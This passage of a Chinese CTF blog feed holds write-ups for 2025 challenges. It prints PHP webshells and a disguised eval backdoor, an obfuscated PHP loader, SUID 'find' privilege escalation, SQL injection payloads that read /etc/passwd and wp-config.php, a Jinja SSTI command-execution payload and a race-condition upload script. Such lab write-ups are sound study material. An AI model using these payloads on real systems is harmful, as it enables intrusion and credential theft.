operator">/</span>gqOcazfJtBrYBZipvDydnrzDfqWrDvCyrcWxaLavDZ0CBuBmJBS<span class="token operator">+</span>i1TDxvaMDq0zuaKugrWJtfmJjIaKqsjaJXuiqDTrotfmvcLcrKOvuqzwmuBnJBS<span class="token operator">+</span>i1TDcriFauBNwvWiDr8dazHnfamulXqplGidqDz8DIukCDreJzG0oq5qcrqWfKP9e1imfLLm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>enc.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">goto</span> gocnm<span class="token punctuation">;</span>pyr9U<span class="token punctuation">:</span><span class="token variable">$AeU4Z</span> <span class="token operator">=</span> <span class="token function">wxrm5</span><span class="token punctuation">(</span><span class="token variable">$ovA2n</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> ZXC1s<span class="token punctuation">;</span>bRFpO<span class="token punctuation">:</span><span class="token variable">$kqXHn</span> <span class="token operator">=</span> <span class="token function">wxrM5</span><span class="token punctuation">(</span><span class="token variable">$G3spL</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> tDl1K<span class="token punctuation">;</span>mPUF3<span class="token punctuation">:</span><span class="token variable">$G3spL</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> bRFpO<span class="token punctuation">;</span>gocnm<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token function-definition function">wxrM5</span><span class="token punctuation">(</span><span class="token variable">$RJ2kh</span><span class="token punctuation">,</span> <span class="token variable">$R53BD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">goto</span> Te0pD<span class="token punctuation">;</span>    U_h6_<span class="token punctuation">:</span>    <span class="token keyword">goto</span> jAnQc<span class="token punctuation">;</span>    <span class="token keyword">goto</span> EUfZj<span class="token punctuation">;</span>    V51ce<span class="token punctuation">:</span>    rgswz<span class="token punctuation">:</span>    <span class="token keyword">goto</span> J8PqR<span class="token punctuation">;</span>    eOzRo<span class="token punctuation">:</span>    <span class="token variable">$hp_8p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> ZBeFr<span class="token punctuation">;</span>    ZBeFr<span class="token punctuation">:</span>    jAnQc<span class="token punctuation">:</span>    <span class="token keyword">goto</span> ka22G<span class="token punctuation">;</span>    dtEi1<span class="token punctuation">:</span>    <span class="token variable">$pdpKe</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$RJ2kh</span><span class="token punctuation">[</span><span class="token variable">$hp_8p</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$pcDaC</span><span class="token punctuation">[</span><span class="token variable">$hp_8p</span> <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> V51ce<span class="token punctuation">;</span>    MmYXr<span class="token punctuation">:</span>    <span class="token variable">$pcDaC</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> eOzRo<span class="token punctuation">;</span>    QbNa9<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token variable">$pdpKe</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> Ju0hu<span class="token punctuation">;</span>    Te0pD<span class="token punctuation">:</span>    <span class="token variable">$pdpKe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> MmYXr<span class="token punctuation">;</span>    J8PqR<span class="token punctuation">:</span>    <span class="token variable">$hp_8p</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> U_h6_<span class="token punctuation">;</span>    ka22G<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$hp_8p</span> <span class="token operator">&lt;</span> <span class="token variable">$R53BD</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">goto</span> fcyLI<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">goto</span> dtEi1<span class="token punctuation">;</span>    EUfZj<span class="token punctuation">:</span>    fcyLI<span class="token punctuation">:</span>    <span class="token keyword">goto</span> QbNa9<span class="token punctuation">;</span>    Ju0hu<span class="token punctuation">:</span><span class="token punctuation">&#125;</span><span class="token keyword">goto</span> mPUF3<span class="token punctuation">;</span>tDl1K<span class="token punctuation">:</span><span class="token variable">$ovA2n</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xd</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">goto</span> pyr9U<span class="token punctuation">;</span>ZXC1s<span class="token punctuation">:</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$kqXHn</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$AeU4Z</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$kqXHn geesecenc</p><p>$AeU4Z config.php</p><p>那么就是执行了<code>geesecenc(config.php)</code></p><p>而 geesecenc 在so文件里</p><hr><h1 id="新年隐患"><a href="#新年隐患" class="headerlink" title="新年隐患"></a>新年隐患</h1><p>找一下可能的后门代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins<span class="token punctuation">)</span> $ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token string">'eval('</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">--include</span><span class="token operator">=</span>*.php <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null./wp-file-manager/lib/files/shell.php:<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>./jetpack/extensions/blocks/ai-chat/ai-response.php:                @eval<span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那就在 &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-content&#x2F;plugins&#x2F;jetpack&#x2F;extensions&#x2F;blocks&#x2F;ai-chat&#x2F;ai-response.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">// AI Chat Module Initialization</span>    <span class="token comment">/* ZmxhZ3tiNGNrZDAwcl9qZXRwYWNrX2FpX2NoYXRfMjAyNH0= */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_model'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_prompt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_prompt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ai_model'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'d41d8cd98f00b204e9800998ecf8427e'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解码得到flag</p><hr><h1 id="提权挑战"><a href="#提权挑战" class="headerlink" title="提权挑战"></a>提权挑战</h1><p>提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/usr/bin/su/usr/bin/gpasswd/usr/bin/chfn/usr/bin/find/usr/bin/chsh/usr/bin/umount/usr/bin/newgrp/usr/bin/passwd/usr/bin/mount/usr/bin/sudo/usr/lib/dbus-1.0/dbus-daemon-launch-helper<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/ls /root/ <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>flag.txt<span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/cat /root/flag.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>flag<span class="token punctuation">&#123;</span>SUID_Command_Injection_Found_2024<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="misc-时光追溯"><a href="#misc-时光追溯" class="headerlink" title="misc-时光追溯"></a>misc-时光追溯</h1><p>从phpinfo可以知道apache日志路径，把日志dump下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/cat /var/log/apache2/access.log.bak <span class="token operator">></span> /tmp/1.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'WPScan'</span> /tmp/1.txt <span class="token operator">></span> /tmp/6.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最下面</p><pre class="line-numbers language-log" data-language="log"><code class="language-log"><span class="token ip-address constant">140.187.54.232</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:17:37 +0000</span><span class="token punctuation">]</span> <span class="token string">"POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">1460</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"</span><span class="token ip-address constant">115.123.255.233</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:17:54 +0000</span><span class="token punctuation">]</span> <span class="token string">"GET /wp-content/plugins/wp-file-manager/lib/files/decode.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">18926677</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"</span><span class="token ip-address constant">134.116.79.14</span> <span class="token separator comment">- - </span><span class="token punctuation">[</span><span class="token date number">24/Jan/2025</span><span class="token operator">:</span><span class="token time number">15:18:02 +0000</span><span class="token punctuation">]</span> <span class="token string">"GET /wp-content/plugins/wp-file-manager/lib/files/decode.php?test=123123123 HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">16979933</span> <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么找最早访问 connector.minimal.php 的地方</p><p><img src="/blog/2025/01/28/CTFplus2025%E6%96%B0%E6%98%A5%E6%8C%91%E6%88%98%E8%B5%9B/image-20250128220534719.png" alt="image-20250128220534719"></p><p><code>24/Jan/2025:15:11:00-37.106.98.98-/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p><p>flag：<code>flag&#123;c40bc119b7c30c0d48ac0e25749e3be0&#125;</code></p><hr><h1 id="misc-数据足迹"><a href="#misc-数据足迹" class="headerlink" title="misc-数据足迹"></a>misc-数据足迹</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /var/log/mysql/slow-query.log.bak <span class="token operator">></span> /tmp/slow.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span class="token punctuation">(</span>www-data:/var/www/html/wp-content/plugins/wp-file-manager/lib/files<span class="token punctuation">)</span> $ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /var/log/mysql/error.log.bak <span class="token operator">></span> /tmp/err.txt <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>dump下来后使用<code> sort slow.log | uniq -c</code>清洗数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sort</span> slow.log <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token parameter variable">-c</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"timestamp"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_usermeta"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Time"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_postmeta"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"Query_time"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"wp_posts"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"comment_post_ID"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"ID"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON wordpress.* TO &#39;hack&#39;@&#39;%&#39;;SELECT * FROM (,6,7,8,9,10) AS t;SELECT * FROM (1,2,3,4,) AS t;SELECT * FROM (4f527564) AS t;SELECT * FROM (4f597275) AS t;SELECT * FROM (596c4153) AS t;SELECT * FROM (5b77616c) AS t;SELECT * FROM (65717f57) AS t;SELECT * FROM (666 *&#x2F;) AS t;SELECT * FROM (6c6c6f62) AS t;SELECT * FROM (7373714d) AS t;SELECT * FROM (747e6f63) AS t;SELECT * FROM (7f6c637f) AS t;SELECT * FROM (LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)) AS t;SELECT * FROM (SELECT * FROM wp_users WHERE id&#x3D;1) AS t;SELECT * FROM (UNION SELECT) AS t;SELECT * FROM wp_links WHERE link_visible &#x3D; &#39;Y&#39;;SELECT * FROM wp_options WHERE autoload&#x3D;&#39;yes&#39;;SELECT * FROM wp_options WHERE option_name LIKE &#39;_site%&#39;;SELECT * FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id &#x3D; tt.term_id;SELECT * FROM wp_terms WHERE term_id IN (SELECT term_id FROM wp_term_taxonomy);SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; AND password &#x3D; &#39;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;;SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;;SELECT * FROM wp_users WHERE user_login &#x3D; &#39;admin&#39; UNION SELECT null,null,null,null,null,null,null,null,null,null;SELECT * FROM wp_users WHERE user_login LIKE 0x61646D696E;SELECT * INTO OUTFILE &#39;&#x2F;tmp&#x2F;dump.txt&#39; FROM wp_users;SELECT &#x2F;* d7275;SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name&#x3D;&#39;wp_users&#39;;SELECT CONCAT(0x7c,user_login,0x7c,user_pass,0x7c) FROM wp_users;SELECT CURRENT_USER();SELECT GROUP_CONCAT(table_name) FROM information_schema.tables;SELECT IF(SUBSTRING(user_pass,1,1)&#x3D;&#39;a&#39;,SLEEP(5),0) FROM wp_users WHERE user_login&#x3D;&#39;admin&#39;;SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;);SELECT LOAD_FILE(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php&#39;);SELECT SCHEMA_NAME FROM information_schema.schemata;SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema&#x3D;&#39;wordpress&#39;;SELECT UNHEX(HEX(LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)));SELECT USER();SELECT VERSION();SELECT id, user_login, user_pass FROM wp_users &#x2F;*dump users*&#x2F;;SELECT option_name, option_value FROM wp_options WHERE option_name LIKE &#39;%key%&#39;;UPDATE wp_users SET user_pass &#x3D; MD5(&#39;hacked&#39;) WHERE user_login &#x3D; &#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察这几个子查询t的部分</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">6c6c6f62747e6f634f5275647373714d4f59727565717f577f6c637f596c41535b77616c666 *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为flag的16进制是<code>666c6167</code>，可知是<strong>逆序加十六进制解码</strong></p><p>解出来是<code>flag&#123;SQLi_slow_query_MAsster_Controll.</code></p><p>猜测和<code>*/</code>有关，找<code>/*</code>那行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT 1 &#x2F;* d7275;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么把这个 d7275 带进去解码，就是flag</p><p>最终的flag：<code>flag&#123;SQLi_slow_query_MAsster_Controller&#125;</code></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;除夕打ctf ver3&lt;/p&gt;
&lt;p&gt;二进制的部分不会啦 _(:3 」∠ )_&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>第八届西湖论剑</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2025-01-18T01:58:56.000Z</published>
    <updated>2025-01-20T13:25:45.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所以 已经没事了😄</p><p>参考：<a href="https://blog.csdn.net/uuzeray/article/details/145228235">https://blog.csdn.net/uuzeray/article/details/145228235</a></p><span id="more"></span><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174518066.png" alt="image-20250118174518066"></p><hr><h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p>输入一些其他字符，然后输入密码会报错弹出flask debug界面</p><p>泄露 app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> is_safe_input<span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> phone <span class="token operator">!=</span> <span class="token string">"1686682318"</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">"Happy_news_admin"</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span>\    <span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>\    <span class="token operator">&lt;</span>head<span class="token operator">></span>\        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>\        <span class="token operator">&lt;</span>title<span class="token operator">></span>login failed<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>\    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到账密<code>1686682318:Happy_news_admin</code></p><p>但是输入正确后依旧重定向回 &#x2F;</p><p>猜测是在 render_template_string 打 ssti，在&#x2F;login处填payload，在&#x2F;cpass处获取回显</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum.__globals__.os.popen<span class="token punctuation">(</span><span class="token string">'ls ..'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在 &#x2F;flagf149</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> abort<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquoteapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>phone <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">is_safe_input</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']</span>    unsafe_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'less'</span><span class="token punctuation">,</span><span class="token string">'nl'</span><span class="token punctuation">,</span><span class="token string">'tac'</span><span class="token punctuation">,</span><span class="token string">'more'</span><span class="token punctuation">,</span><span class="token string">'tail'</span><span class="token punctuation">,</span><span class="token string">'od'</span><span class="token punctuation">,</span><span class="token string">'grep'</span><span class="token punctuation">,</span><span class="token string">'awd'</span><span class="token punctuation">,</span><span class="token string">'sed'</span><span class="token punctuation">,</span><span class="token string">'64'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'%2f'</span><span class="token punctuation">,</span><span class="token string">'%2F'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造rce：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>%26%26head f<span class="token punctuation">\</span>lagf149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118105248402.png" alt="image-20250118105248402"></p><hr><h1 id="Rank-U（Unsolved）"><a href="#Rank-U（Unsolved）" class="headerlink" title="Rank-U（Unsolved）"></a>Rank-U（Unsolved）</h1><p>进去一个登录框，弱密码爆破失败，sql注入无果</p><p>PHP&#x2F;7.3.28 Apache&#x2F;2.4.38 (Debian)</p><p>换了几个字典，最终爆出 year2000</p><p>里面一个文件上传，啥都能传，但是访问 Uploads 里的文件路径只有 jpg 后缀的能读到，猜测其他后缀是被删了</p><p>尝试条件竞争，py脚本+burp把我c盘缓存淦爆了都没竞争成功</p><br><p>存个条件竞争的脚本吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    burp0_url <span class="token operator">=</span> <span class="token string">"http://139.155.126.78:30675/admin/index.php"</span>  <span class="token comment"># 更新 URL</span>    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"bsgq3v7goubrk1ciepr0se2dfc"</span><span class="token punctuation">&#125;</span>  <span class="token comment"># 更新 PHP 会话 ID</span>        burp0_data <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">"------WebKitFormBoundarygIbPTT5pJVbv72RS\r\n"</span>        <span class="token string">"Content-Disposition: form-data; name=\"file_upload\"; filename=\"yjh3.php\"\r\n"</span>        <span class="token string">"Content-Type: application/octet-stream\r\n\r\n"</span>        <span class="token string">"&lt;?php echo file_get_contents('/flag');?>\r\n"</span>  <span class="token comment"># 改为新代码</span>        <span class="token string">"------WebKitFormBoundarygIbPTT5pJVbv72RS--\r\n"</span>    <span class="token punctuation">)</span>        <span class="token comment"># 发送 POST 请求，只保留 Cookie</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> 